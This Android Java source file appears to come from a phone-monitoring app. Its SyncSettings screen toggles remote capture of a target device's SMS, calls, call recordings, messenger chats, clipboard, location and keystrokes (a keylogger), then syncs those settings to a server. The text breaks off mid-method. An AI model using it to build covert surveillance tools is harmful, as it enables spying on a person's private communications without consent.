/*
  ClassName: Dashboard.java
  AppName: ViewerApp
  Created by Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: Class Dashboard use to display a list of settings for enabling or disabling features such as:
  CallHistory, SMSHistory, LocationHistory, NotesHistory...
  History:2018-10-08
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.View;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.SwitchCompat;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;
import com.scp.viewer.API.APIDatabase;
import com.scp.viewer.API.APIURL;
import com.scp.viewer.Database.DatabaseDevice;
import com.scp.viewer.Database.DatabaseGetSetting;
import com.scp.viewer.Model.Body;
import com.scp.viewer.Model.Data;
import com.scp.viewer.Model.DeviceFeatures;
import com.scp.viewer.Model.Table;
import com.scp.viewer.R;
import com.google.gson.Gson;
import com.scp.viewer.API.Global;
import com.wang.avi.AVLoadingIndicatorView;

import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import static com.scp.viewer.API.APIMethod.startAnim;
import static com.scp.viewer.API.APIMethod.stopAnim;
import static com.scp.viewer.API.Global.LIMIT_REFRESH;
import static com.scp.viewer.API.Global.REQUEST_CODE_GPS_ACCESS_CODE;
import static com.scp.viewer.API.Global.time_Refresh_Setting;

public class SyncSettings extends AppCompatActivity implements View.OnClickListener {
    private SwipeRefreshLayout swp_Dashboard;

    private TextView txt_Last_Sync;
    private LinearLayout ln_AccessCode;
    private TextView txt_Access_Code;
    private Spinner spn_Transfer_multimedia_data,spn_GPS_Interval,spn_Distance_Filter;
    private Button btn_Save_Sync;
    private SwitchCompat wc_Save_Battery, wc_History_SMS, wc_History_Call,
            wc_History_URL, wc_History_Contact, wc_History_Photo, wc_History_Application,
            wc_History_Phone_Call, wc_History_WhatsApp, wc_History_Viber, wc_History_Facebook,
            wc_History_Skype, wc_History_Notes, wc_History_Hangouts, wc_History_Location,
            wc_Auto_TurnOn_Wifi, wc_History_Notification, wc_History_Keylogger,wc_History_Calendar,
            wc_History_AppInstall, wc_History_Wifi_Status, wc_History_Alert, wc_History_Clipboard;
    public Table table;
    private String packageID;
    private List<DeviceFeatures> deviceFeatureList = new ArrayList<>();
    public DatabaseGetSetting databaseGetSetting;
    // aviSyncSettings
    private AVLoadingIndicatorView avLoadingIndicatorView;
    private DeviceFeatures deviceFeature = new DeviceFeatures();
    public static String DEVICE_NAME;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_syncsettings);
        DEVICE_NAME = Settings.Secure.getString(getContentResolver(), "bluetooth_name") + "  ";
        /* database */
        DatabaseDevice databaseDevice = new DatabaseDevice(this);
        databaseGetSetting = new DatabaseGetSetting(this);
        String modelDevice = getIntent().getStringExtra("device");
        packageID = getIntent().getStringExtra("packageID");
        Log.i("zpackageID",packageID+"");
        List<Table> tableList = databaseDevice.getAllDevice();
        for (Table t : tableList) {

            if (t.getID().equals(modelDevice)) {
                table = t;
                break;
            }
        }
        setID();
        setEvent();
        getSetting();
    }


    /** Set event OnClickListener of variable Button in class */
    private void setEvent() {
        //wc_History_Application.setEnabled(false);
        btn_Save_Sync.setOnClickListener(this);
        wc_Save_Battery.setOnClickListener(this);
        ln_AccessCode.setOnClickListener(this);
        swp_Dashboard();
    }

    /** Set ID from activity_dashboard for class variable */
    private void setID() {

        avLoadingIndicatorView = findViewById(R.id.aviSyncSettings);
        ImageView img_Phone_Type = findViewById(R.id.img_PhoneStyle);
        TextView txt_NamePhone = findViewById(R.id.txt_NamePhone);
        TextView txt_PhoneStyle = findViewById(R.id.txt_PhoneStyle);
        txt_Access_Code = findViewById(R.id.txt_AccessCode);
        TextView txt_PhoneVersion = findViewById(R.id.txt_PhoneVersion);
        txt_Last_Sync = findViewById(R.id.txt_Last_Sync);
        spn_Transfer_multimedia_data = findViewById(R.id.spn_Transfer_multimedia_data);
        ln_AccessCode = findViewById(R.id.ln_AccessCode);
        spn_Distance_Filter = findViewById(R.id.spn_Distance_Filter);
        spn_GPS_Interval = findViewById(R.id.spn_GPS_Interval);
        swp_Dashboard = findViewById(R.id.swp_Dashboard);
        btn_Save_Sync = findViewById(R.id.btn_Save_Sync);
        wc_History_Location = findViewById(R.id.wc_History_Location);
        wc_Save_Battery = findViewById(R.id.wc_Save_Battery);
        wc_History_SMS = findViewById(R.id.wc_History_SMS);
        wc_History_Call = findViewById(R.id.wc_History_Call);
        wc_History_URL = findViewById(R.id.wc_History_URL);
        wc_History_Contact = findViewById(R.id.wc_History_Contact);
        wc_History_Photo = findViewById(R.id.wc_History_Photo);
        wc_History_Application = findViewById(R.id.wc_History_Application);
        wc_History_Phone_Call = findViewById(R.id.wc_History_Phone_Call);
        wc_History_WhatsApp = findViewById(R.id.wc_History_WhatsApp);
        wc_History_Viber = findViewById(R.id.wc_History_Viber);
        wc_History_Facebook = findViewById(R.id.wc_History_Facebook);
        wc_History_Skype = findViewById(R.id.wc_History_Skype);
        wc_History_Notes = findViewById(R.id.wc_History_Notes);
        wc_History_Hangouts = findViewById(R.id.wc_History_Hangouts);
        wc_Auto_TurnOn_Wifi = findViewById(R.id.wc_Auto_TurnOn_Wifi);
        wc_History_Notification = findViewById(R.id.wc_History_Notification);
        wc_History_Keylogger = findViewById(R.id.wc_History_Keylogger);
        wc_History_AppInstall = findViewById(R.id.wc_History_AppInstall);
        wc_History_Wifi_Status = findViewById(R.id.wc_History_Wifi_Status);
        wc_History_Alert = findViewById(R.id.wc_History_Alert);
        wc_History_Clipboard = findViewById(R.id.wc_History_Clipboard);
        wc_History_Calendar = findViewById(R.id.wc_History_Calendar);
        setPackageID();
        txt_NamePhone.setText(table.getDevice_Name());
        txt_PhoneStyle.setText(table.getOS_Device());
        DatabaseGetSetting databaseGetSetting = new DatabaseGetSetting(this);
        List<DeviceFeatures> deviceFeatureList = databaseGetSetting.getAllSetting();
        txt_PhoneVersion.setText(table.getApp_Version_Number());
        if (table.getOS_Device().equals("iOS")) {
            img_Phone_Type.setImageResource(R.drawable.phone_android);
        } else {
            img_Phone_Type.setImageResource(R.drawable.phone_android);
        }
        setSpinner();
    }

    /**
     * setClickableItems This is the method that, without the internet, the features are not enabled or disabled.
     */
    private void setClickableItems(boolean setClickable)
    {
        txt_Access_Code.setEnabled(setClickable);
        txt_Last_Sync.setEnabled(setClickable);
        spn_Transfer_multimedia_data.setEnabled(setClickable);
        ln_AccessCode.setEnabled(setClickable);
        spn_Distance_Filter.setEnabled(setClickable);
        spn_GPS_Interval.setEnabled(setClickable);
        swp_Dashboard.setEnabled(setClickable);
        btn_Save_Sync.setEnabled(setClickable);
        wc_History_Location.setEnabled(setClickable);
        wc_Save_Battery.setEnabled(setClickable);
        wc_History_SMS.setEnabled(setClickable);
        wc_History_Call.setEnabled(setClickable);
        wc_History_URL.setEnabled(setClickable);
        wc_History_Contact.setEnabled(setClickable);
        wc_History_Photo.setEnabled(setClickable);
        wc_History_Application.setEnabled(setClickable);
        wc_History_Phone_Call.setEnabled(setClickable);
        wc_History_WhatsApp.setEnabled(setClickable);
        wc_History_Viber.setEnabled(setClickable);
        wc_History_Facebook.setEnabled(setClickable);
        wc_History_Skype.setEnabled(setClickable);
        wc_History_Notes.setEnabled(setClickable);
        wc_History_Hangouts.setEnabled(setClickable);
        wc_Auto_TurnOn_Wifi.setEnabled(setClickable);
        wc_History_Notification.setEnabled(setClickable);
        wc_History_Keylogger.setEnabled(setClickable);
        wc_History_AppInstall.setEnabled(setClickable);
        wc_History_Wifi_Status.setEnabled(setClickable);
        wc_History_Alert.setEnabled(setClickable);
        wc_History_Clipboard.setEnabled(setClickable);
        wc_History_Calendar.setEnabled(setClickable);
    }

    private void setPackageID() {
        switch (packageID){

            case "Gold":
            case "Premium": {
                wc_History_URL.setEnabled(true);
                wc_History_Phone_Call.setEnabled(true);
                wc_History_Photo.setEnabled(true);
                wc_History_Skype.setEnabled(true);
                wc_History_Notes.setEnabled(true);
                wc_History_Hangouts.setEnabled(true);
                break;
            }
            case "Standard":
            {
                //wc_History_WhatsApp.setEnabled(true);
                wc_History_URL.setEnabled(false);
                wc_History_Phone_Call.setEnabled(false);
                wc_History_Photo.setEnabled(false);
                wc_History_Skype.setEnabled(false);
                wc_History_Notes.setEnabled(false);
                wc_History_Hangouts.setEnabled(false);
                break;
            }
        }
    }
    @Override
    protected void onResume() {
        MyApplication.getInstance().trackScreenView("Dashboard Screen");
        super.onResume();
    }

    private void getSetting() {
        if (APIURL.isConnected(this)) {
            avLoadingIndicatorView.setVisibility(View.VISIBLE);
            startAnim(avLoadingIndicatorView);
            setClickableItems(false);
            new getSettingAsyncTask().execute();
        } else {

            setClickableItems(false);
            /*  int i: Count objects in the User table.
              i==0: the user table is empty.
              */
            int i = databaseGetSetting.getSettingCount();
            if (i == 0) {
                Toast.makeText(this, "The data of this device " + table.getDevice_Name() + " has not been saved to memory! Please turn on the internet and go back to the app to save the data.", Toast.LENGTH_LONG).show();

            } else {
                /* Check if the table exists! */
                boolean testDevice = false;
                deviceFeatureList.clear();
                deviceFeatureList = databaseGetSetting.getAllSetting();
                for (DeviceFeatures d : deviceFeatureList) {
                    if (d.getDevice_ID().equals(table.getDevice_Identifier())) {
                        deviceFeature = d;
                        testDevice = true;
                        break;
                    }
                }

                /*
                  if(testDevice == true) is table exists
                 */
                if (testDevice) {
                    APIDatabase.getTimeLastSync(txt_Last_Sync, SyncSettings.this, table.getLast_Online());

                    txt_Access_Code.setText(deviceFeature.getSecret_Key());

                    // assignment on enabled or off the same button for the node
                    setSwitchCompatList(deviceFeature);

                    Log.d("xae",deviceFeature.getConnection_Type()+ " =  getConnection_Type" );
                    if (deviceFeature.getConnection_Type().contains("AutoOpenAllTypes")) {
                        wc_Auto_TurnOn_Wifi.setChecked(true);
                    }
                }

                /*
                  if(testDevice == false) is table does not exist
                 */
                else {

                    APIURL.alertDialog(SyncSettings.this,"Save & Sync",getString(R.string.SaveAndSync_NotSave,table.getDevice_Name()));
                }
            }
        }
    }

    @SuppressLint("SetTextI18n")
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (resultCode == RESULT_OK && requestCode == REQUEST_CODE_GPS_ACCESS_CODE) {
            if (data.hasExtra("Code")) {
                txt_Access_Code.setText(data.getExtras().getString("Code"));
            }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onClick(View view) {

        switch (view.getId()) {
            case R.id.btn_Save_Sync: {
                MyApplication.getInstance().trackEvent("Dashboard", "Open Save_Sync", "");
                if (APIURL.isConnected(this)) {
                    avLoadingIndicatorView.setVisibility(View.VISIBLE);
                    setClickableItems(false);
                    startAnim(avLoadingIndicatorView);
                    new set_SettingAsyncTask().execute();
                    new getSettingAsyncTask().execute();
                    //APIDatabase.getTimeLastSync(txt_Last_Sync, Dashboard.this, table.getModified_Date());
                } else {
                    //
                    //APIDatabase.getTimeLastSync(txt_Last_Sync, Dashboard.this, table.getDevice_ID());
                    setClickableItems(false);
                    APIURL.noInternet(SyncSettings.this);
                }
                break;
            }
            case R.id.ln_AccessCode: {
                /* Open the Access Code class and transmit the Access_Code value */
                MyApplication.getInstance().trackEvent("Dashboard", "Open AccessCode", "");
                Intent intent1 = new Intent(this, AccessCode.class);
                intent1.putExtra("Access_Code", txt_Access_Code.getText().toString());
                startActivityForResult(intent1, REQUEST_CODE_GPS_ACCESS_CODE);
                break;
            }
            case R.id.wc_Save_Battery: {
                if(wc_Save_Battery.isChecked())
                {
                    spn_GPS_Interval.setSelection(3);
                    spn_Distance_Filter.setEnabled(false);
                    spn_Distance_Filter.setSelection(0);
                    spn_Transfer_multimedia_data.setEnabled(false);
                    spn_Transfer_multimedia_data.setSelection(1);
                    spn_GPS_Interval.setEnabled(false);
                    wc_Auto_TurnOn_Wifi.setChecked(false);
                    wc_Auto_TurnOn_Wifi.setEnabled(false);
                }
                else {
                    spn_GPS_Interval.setEnabled(true);
                    wc_Auto_TurnOn_Wifi.setEnabled(true);
                    spn_Distance_Filter.setEnabled(true);
                    spn_Transfer_multimedia_data.setEnabled(true);
                }
                break;
            }
        }
    }

    @SuppressLint("StaticFieldLeak")
    private class getSettingAsyncTask extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... strings) {
            String value = "<RequestParams Client_Time=\"" + APIURL.getTimeNow() + "\" Device_ID=\"" + table.getDevice_Identifier() + "\"/>";
            String function = "GetSetting";
            return APIURL.POST(value, function);
        }

        @Override
        protected void onPostExecute(String s) {
            try {
                JSONObject jsonObject = new JSONObject(s);
                Body body = APIURL.fromJson(jsonObject);
                JSONObject jsonObjectDaTa = new JSONObject(body.getData());
                Gson gson = new Gson();
                Data data = APIURL.dataJson(jsonObjectDaTa);
                DeviceFeatures deviceFeature = gson.fromJson(data.getDeviceFeature(), DeviceFeatures.class);

                databaseGetSetting.addGetSetting(deviceFeature);
                txt_Access_Code.setText(String.valueOf(deviceFeature.getSecret_Key()));
                APIDatabase.getTimeLastSync(txt_Last_Sync, SyncSettings.this, table.getLast_Online());

                setSwitchCompatList(deviceFeature);

             try {
                 if(deviceFeature.getConnection_Type() != null && (!deviceFeature.getConnection_Type().isEmpty()))
                 {
                     if (deviceFeature.getConnection_Type().contains("AutoOpenAllTypes")) {
                         wc_Auto_TurnOn_Wifi.setChecked(true);
                     }
                 }
                 else {
                     wc_Auto_TurnOn_Wifi.setChecked(false);
                 }

             }catch (Exception e)
             {
                 wc_Auto_TurnOn_Wifi.setChecked(false);
                 e.getMessage();
             }

                avLoadingIndicatorView.setVisibility(View.GONE);
                stopAnim(avLoadingIndicatorView);
            } catch (JSONException e) {
                MyApplication.getInstance().trackException(e);
                e.printStackTrace();
                //logger.error("getSettingAsyncTask =="+ e+"\n================End");
            }
            setClickableItems(true);
        }
    }

    private void setSwitchCompatList(DeviceFeatures deviceFeature)
    {
        if (deviceFeature.getgPS() == 1) {
            wc_History_Location.setChecked(true);
        }
        spn_GPS_Interval.setSelection(checkDataGPSInterval(deviceFeature.getgPS_Interval()));
        spn_Distance_Filter.setSelection(check_Distance_Filter(deviceFeature.getHorizontal()));
        if(deviceFeature.getConnection_Type()==null || deviceFeature.getConnection_Type().contains("WiFi|"))
        {
            spn_Transfer_multimedia_data.setSelection(1);
        }else {

            spn_Transfer_multimedia_data.setSelection(0);
        }

        if (deviceFeature.getsMS() == null ||deviceFeature.getsMS() == 0) {
            wc_History_SMS.setChecked(false);
        }else {
            wc_History_SMS.setChecked(true);
        }
        if (deviceFeature.getCall() == null ||deviceFeature.getCall() == 0) {
            wc_History_Call.setChecked(false);
        }else {
            wc_History_Call.setChecked(true);
        }

        if (deviceFeature.getuRL() == null ||deviceFeature.getuRL() == 0) {
            wc_History_URL.setChecked(false);
        }else {
            wc_History_URL.setChecked(true);
        }
        if (deviceFeature.getContact() == null ||deviceFeature.getContact() == 0) {
            wc_History_Contact.setChecked(false);
        }else {
            wc_History_Contact.setChecked(true);
        }
        if (deviceFeature.getPhoto() == null ||deviceFeature.getPhoto() == 0) {
            wc_History_Photo.setChecked(false);
        }else {
            wc_History_Photo.setChecked(true);
        }
        if (deviceFeature.getApp() == null ||deviceFeature.getApp() == 0) {
            wc_History_Application.setChecked(false);
        }else {
            wc_History_Application.setChecked(true);
        }
        if (deviceFeature.getRecorded_Call() == null ||deviceFeature.getRecorded_Call() == 0) {
            wc_History_Phone_Call.setChecked(false);
        }else {
            wc_History_Phone_Call.setChecked(true);
        }
        if (deviceFeature.getWhatApp()== null ||deviceFeature.getWhatApp() == 0) {
            wc_History_WhatsApp.setChecked(false);
        }else {
            wc_History_WhatsApp.setChecked(true);
        }
        if (deviceFeature.getViber() == null ||deviceFeature.getViber() == 0) {
            wc_History_Viber.setChecked(false);
        }else {
            wc_History_Viber.setChecked(true);
        }
        if (deviceFeature.getFacebook() == null ||deviceFeature.getFacebook() == 0) {
            wc_History_Facebook.setChecked(false);
        }else {
            wc_History_Facebook.setChecked(true);
        }
        if (deviceFeature.getSkype() == null ||deviceFeature.getSkype() == 0) {
            wc_History_Skype.setChecked(false);
        }else {
            wc_History_Skype.setChecked(true);
        }
        if (deviceFeature.getNote() == null ||deviceFeature.getNote() == 0) {
            wc_History_Notes.setChecked(false);
        }else {
            wc_History_Notes.setChecked(true);
        }

        if (deviceFeature.getHangouts() == null ||deviceFeature.getHangouts() == 0) {
            wc_History_Hangouts.setChecked(false);
        }else {
            wc_History_Hangouts.setChecked(true);
        }
        if (deviceFeature.getSave_Battery() == null ||deviceFeature.getSave_Battery() == 0) {
            wc_Save_Battery.setChecked(false);
            spn_GPS_Interval.setEnabled(true);
            wc_Auto_TurnOn_Wifi.setEnabled(true);
            spn_Distance_Filter.setEnabled(true);
            spn_Transfer_multimedia_data.setEnabled(true);

        } else {
            wc_Save_Battery.setChecked(true);
            spn_GPS_Interval.setSelection(3);
            spn_Distance_Filter.setEnabled(false);
            spn_Distance_Filter.setSelection(0);
            spn_Transfer_multimedia_data.setEnabled(false);
            spn_Transfer_multimedia_data.setSelection(1);
            spn_GPS_Interval.setEnabled(false);
            wc_Auto_TurnOn_Wifi.setChecked(false);
            wc_Auto_TurnOn_Wifi.setEnabled(false);
        }
        if (deviceFeature.getKeyLogger() == null ||deviceFeature.getKeyLogger() == 0) {
            wc_History_Keylogger.setChecked(false);
        } else {
            wc_History_Keylogger.setChecked(true);
        }
        if (deviceFeature.getNotification() == null ||deviceFeature.getNotification() == 0) {
            wc_History_Notification.setChecked(false);
        } else {
            wc_History_Notification.setChecked(true);
        }
        if (deviceFeature.getApp_Installation() == null ||deviceFeature.getApp_Installation() == 0) {
            wc_History_AppInstall.setChecked(false);
        } else {
            wc_History_AppInstall.setChecked(true);
        }
        if (deviceFeature.getAlert() == null ||deviceFeature.getAlert() == 0) {
            wc_History_Alert.setChecked(false);
        } else {
            wc_History_Alert.setChecked(true);
        }
        if (deviceFeature.getNetwork_Connection() == null ||deviceFeature.getNetwork_Connection() == 0) {
            wc_History_Wifi_Status.setChecked(false);
        } else {
            wc_History_Wifi_Status.setChecked(true);
        }
        if (deviceFeature.getClipboard() == null ||deviceFeature.getClipboard() == 0) {
            wc_History_Clipboard.setChecked(false);
        } else {
            wc_History_Clipboard.setChecked(true);
        }
        if (deviceFeature.getCalendar() == null ||deviceFeature.getCalendar() == 0) {
            wc_History_Calendar.setChecked(false);
        } else {
            wc_History_Calendar.setChecked(true);
        }
    }

    @SuppressLint("StaticFieldLeak")
    private class set_SettingAsyncTask extends AsyncTask<String, Void, String> {

        @SuppressLint("WrongThread")
        @Override
        protected String doInBackground(String... strings) {


            String Connection_Type;
            int horizontal,GPS_Interval,GPS = 0, SMS = 0, Photo = 0, Skype = 0, Notes = 0, Video = 0, Voice = 0, Ambient_Voice = 0,
                    Key_Logger = 0, BBM = 0, LINE = 0, KIK = 0, Hangouts = 0, save_Battery = 0, Calendar = 0,
                    Facebook = 0, WhatsApp = 0, Viber = 0, Application = 0, Phone_Call = 0, Call = 0,
                    URLs = 0, Contact = 0, Notification = 0, App_Install = 0, Alert = 0, Clipboard = 0, WiFi_Status = 0;
            GPS_Interval = checkData(spn_GPS_Interval.getSelectedItem()+"");
            horizontal = check_Data_Distance_Filter(spn_Distance_Filter.getSelectedItem()+"");
            if(spn_Transfer_multimedia_data.getSelectedItem().equals("WiFi only")){
                Connection_Type = "WiFi|";
            }else {
                Connection_Type = "WiFi/CellularData|";
            }
            if(wc_Auto_TurnOn_Wifi.isChecked())
            {
                Connection_Type = Connection_Type+"AutoOpenAllTypes";
            }

            if (wc_History_Location.isChecked()) {
                GPS = 1;
            }

            if (wc_History_SMS.isChecked()) {
                SMS = 1;
            }
            if (wc_History_Call.isChecked()) {
                Call = 1;
            }
            if (wc_History_URL.isChecked()) {
                URLs = 1;
            }
            if (wc_History_Contact.isChecked()) {
                Contact = 1;
            }
            if (wc_History_Photo.isChecked()) {
                Photo = 1;
            }
            if (wc_History_Application.isChecked()) {
                Application = 1;
            }
            if (wc_History_Phone_Call.isChecked()) {
                Phone_Call = 1;
            }
            if (wc_History_WhatsApp.isChecked()) {
                WhatsApp = 1;
            }
            if (wc_History_Viber.isChecked()) {
                Viber = 1;
            }
            if (wc_History_Facebook.isChecked()) {
                Facebook = 1;
            }
            if (wc_History_Skype.isChecked()) {
                Skype = 1;
            }
            if (wc_History_Notes.isChecked()) {
                Notes = 1;
            }
            if (wc_History_Hangouts.isChecked()) {
                Hangouts = 1;
            }

            if (wc_History_Keylogger.isChecked()) {
                Key_Logger = 1;
            }
            if (wc_History_Notification.isChecked()) {
                Notification = 1;
            }
            if (wc_History_AppInstall.isChecked()) {
                App_Install = 1;
            }
            if (wc_History_Clipboard.isChecked()) {
                Clipboard = 1;
            }
            if (wc_History_Wifi_Status.isChecked()) {
                WiFi_Status = 1;
            }
            if (wc_History_Alert.isChecked()) {
                Alert = 1;
            }
            if (wc_Save_Battery.isChecked()) {
                save_Battery = 1;
            }
            if (wc_History_Calendar.isChecked()) {
                Calendar = 1;
            }

            int y = 120;
            String value ="";

            Log.d("asss", ManagementDevice.android_id);

                value = "<RequestParams " +
                        "App=\"" + Application + "\""
                        + " Call=\"" + Call
                        + "\" Voice_Memos=\"" + 0
                        + "\" GPS_Interval=\"" + GPS_Interval
                        + "\" Bbm=\"" + BBM
                        + "\" Secret_Key=\"" + txt_Access_Code.getText()
                        + "\" Hangouts=\"" + Hangouts
                        + "\" Client_Date=\"" + APIURL.getTimeNow()
                        + "\" SMS=\"" + SMS
                        + "\" Device_ID=\"" + table.getDevice_Identifier()
                        + "\" Video=\"" + 0
                        + "\" WhatsApp=\"" + WhatsApp
                        + "\" Line=\"" + LINE
                        + "\" Kik=\"" + KIK
                        + "\" Note=\"" + Notes
                        + "\" Facebook=\"" + Facebook
                        +"\" GPS=\"" + GPS
                        + "\" Skype=\"" + Skype
                        + "\" Photo=\"" + Photo
                        + "\" Horizontal=\""+horizontal
                        + "\" Connection_Type=\""+Connection_Type
                        + "\" PhoneCallRecording=\"" + Phone_Call
                        + "\" Contact=\"" + Contact
                        + "\" URL=\"" + URLs
                        + "\" Save_Battery=\"" + save_Battery
                        + "\" Default_Phone=\"0\""
                        + " Viber=\"" + Viber+ "\""
                        + " KeyLogger=\"" + Key_Logger + "\""
                        + " Notification=\"" + Notification + "\""
                        + " Network_Connection=\"" + WiFi_Status + "\""
                        + " Calendar=\"" + Calendar + "\""
                        + " Clipboard=\"" + Clipboard + "\""
//                        + " Alert=\"" + Alert + "\""
                        + " App_Installation=\"" + App_Install + "\""
                        + " Device_Name=\"" + DEVICE_NAME + "\""
                        + " OS_Device=\"" + Global.MODEL + "\" />";
                Log.d("App_Installation", "App_Installation = "+ App_Install);
            String function = "SetSetting";
            return APIURL.POST(value, function);
        }

        @Override
        protected void onPostExecute(String s) {

            try {
                JSONObject jsonObject = new JSONObject(s);
                Body body = APIURL.fromJson(jsonObject);
                if (body.getResultId().equals("1") && body.getIsSuccess().equals("1")) {
                    APIURL.alertDialog(SyncSettings.this,"Save & Sync","Saved successfully.");
                } else {
                    APIURL.alertDialog(SyncSettings.this,"Save & Sync","can't Update! "+ body.getResultId());

                }
                avLoadingIndicatorView.setVisibility(View.GONE);
                stopAnim(avLoadingIndicatorView);
                setClickableItems(true);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    public void swp_Dashboard() {
        swp_Dashboard.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                Calendar calendar = Calendar.getInstance();
                if (APIURL.isConnected(getApplicationContext())) {
                    if ((calendar.getTimeInMillis() - time_Refresh_Setting) > LIMIT_REFRESH) {
                        //new getSettingAsyncTask().execute();
                        getSetting();
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {

                                swp_Dashboard.setRefreshing(false);
                                Calendar calendar1 = Calendar.getInstance();
                                time_Refresh_Setting = calendar1.getTimeInMillis();
                            }
                        }, 3000);
                    } else {
                        swp_Dashboard.setRefreshing(false);
                    }
                } else {
                    swp_Dashboard.setRefreshing(false);
                    //
                    APIDatabase.getTimeLastSync(txt_Last_Sync, SyncSettings.this, table.getLast_Online());
                    APIURL.noInternet(SyncSettings.this);
                }
            }
        });
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

    private void setSpinner() {

        List<String> list = new ArrayList<>();
        list.add("WiFi or Cellular Data(3G/4G)");
        list.add("WiFi only");
        ArrayAdapter<String> dataAdapter = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, list);
        dataAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spn_Transfer_multimedia_data.setAdapter(dataAdapter);

        // Distance_Filter
        List<String> list_Distance_Filter = new ArrayList<>();
        list_Distance_Filter.add("No filter");
        list_Distance_Filter.add("50 "+getString(R.string.meters));
        list_Distance_Filter.add("500 "+getString(R.string.meters));
        list_Distance_Filter.add("1000 "+getString(R.string.meters));
        list_Distance_Filter.add("1500 "+getString(R.string.meters));
        list_Distance_Filter.add("2000 "+getString(R.string.meters));
        list_Distance_Filter.add("2500 "+getString(R.string.meters));
        list_Distance_Filter.add("3000 "+getString(R.string.meters));
        list_Distance_Filter.add("3500 "+getString(R.string.meters));
        list_Distance_Filter.add("4000 "+getString(R.string.meters));
        list_Distance_Filter.add("4500 "+getString(R.string.meters));
        list_Distance_Filter.add("5000 "+getString(R.string.meters));
        ArrayAdapter<String> dataAdapter_Distance_Filter = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, list_Distance_Filter);
        dataAdapter_Distance_Filter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spn_Distance_Filter.setAdapter(dataAdapter_Distance_Filter);

        // GPSInterval
        List<String> list_GPSInterval  = new ArrayList<>();
        list_GPSInterval.add("5 "+getString(R.string.minutes));
        list_GPSInterval.add("15 "+getString(R.string.minutes));
        list_GPSInterval.add("30 "+getString(R.string.minutes));
        list_GPSInterval.add("60 "+getString(R.string.minutes));
        list_GPSInterval.add("90 "+getString(R.string.minutes));
        list_GPSInterval.add("120 "+getString(R.string.minutes));
        list_GPSInterval.add("150 "+getString(R.string.minutes));
        list_GPSInterval.add("180 "+getString(R.string.minutes));
        ArrayAdapter<String> dataAdapter_GPSInterval = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, list_GPSInterval);
        dataAdapter_GPSInterval.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spn_GPS_Interval.setAdapter(dataAdapter_GPSInterval);
    }
    private int checkData(String time){
        int check = 0;
        if(time.equals("5 " + getString(R.string.minutes))){
            check = 5;
        }else if(time.equals("15 " + getString(R.string.minutes)))
        {
            check = 15;
        }else if(time.equals("30 " + getString(R.string.minutes)))
        {
            check = 30;
        }else if(time.equals("60 " + getString(R.string.minutes)))
        {
            check = 60;
        }else if(time.equals("90 " + getString(R.string.minutes)))
        {
            check = 90;
        }else if(time.equals("120 " + getString(R.string.minutes)))
        {
            check = 120;
        }else if(time.equals("150 " + getString(R.string.minutes)))
        {
            check = 150;
        }else if(time.equals("180 " + getString(R.string.minutes)))
        {
            check = 180;
        }
        return check;
    }
    private int check_Data_Distance_Filter(String time){
        int check = 0;
        if(time.equals("50 " + getString(R.string.meters))){
            check = 50;
        }else if(time.equals("500 " + getString(R.string.meters)))
        {
            check = 500;
        }else if(time.equals("1000 " + getString(R.string.meters)))
        {
            check = 1000;
        }else if(time.equals("1500 " + getString(R.string.meters)))
        {
            check = 1500;
        }else if(time.equals("2000 " + getString(R.string.meters)))
        {
            check = 2000;
        }else if(time.equals("2500 " + getString(R.string.meters)))
        {
            check = 2500;
        }else if(time.equals("3000 " + getString(R.string.meters)))
        {
            check = 3000;
        }else if(time.equals("3500 " + getString(R.string.meters)))
        {
            check = 3500;
        }else if(time.equals("4000 " + getString(R.string.meters)))
        {
            check = 4000;
        }else if(time.equals("4500 " + getString(R.string.meters)))
        {
            check = 4500;
        }else if(time.equals("5000 " + getString(R.string.meters)))
        {
            check = 5000;
        }
        return check;
    }
    private int check_Distance_Filter(int time){
        int check = 0;
        if(time ==50 )
        {
            check = 1;
        }else if(time == 500)
        {
            check = 2;
        }else if(time == 1000)
        {
            check = 3;
        }else if(time == 1500)
        {
            check = 4;
        }else if(time == 2000)
        {
            check = 5;
        }else if(time == 2500)
        {
            check = 6;
        }else if(time == 3000)
        {
            check = 7;
        }else if(time == 3500)
        {
            check = 8;
        }
        else if(time == 4000)
        {
            check = 9;
        }
        else if(time == 4500)
        {
            check = 10;
        }else if(time == 5000)
        {
            check = 11;
        }
        return check;
    }
    private int checkDataGPSInterval(int time){
        int check = 0;
        if(time == 0){
            check = 2;
        }else if(time == 5)
        {
            check = 0;
        }else if(time == 15)
        {
            check = 1;
        }else if(time == 30)
        {
            check = 2;
        }else if(time == 60)
        {
            check = 3;
        }else if(time == 90)
        {
            check = 4;
        }else if(time == 120)
        {
            check = 5;
        }else if(time == 150)
        {
            check = 6;
        }else if(time == 180)
        {
            check = 7;
        }
        return check;
    }
    private int checkListReport(int timeGPS){
        int check = 0;
        if(timeGPS == 5){
            check = 0;
        }else if(timeGPS == 15)
        {
            check = 1;
        }else if(timeGPS == 30)
        {
            check = 2;
        }else if(timeGPS == 60)
        {
            check = 3;
        }else if(timeGPS == 90)
        {
            check = 4;
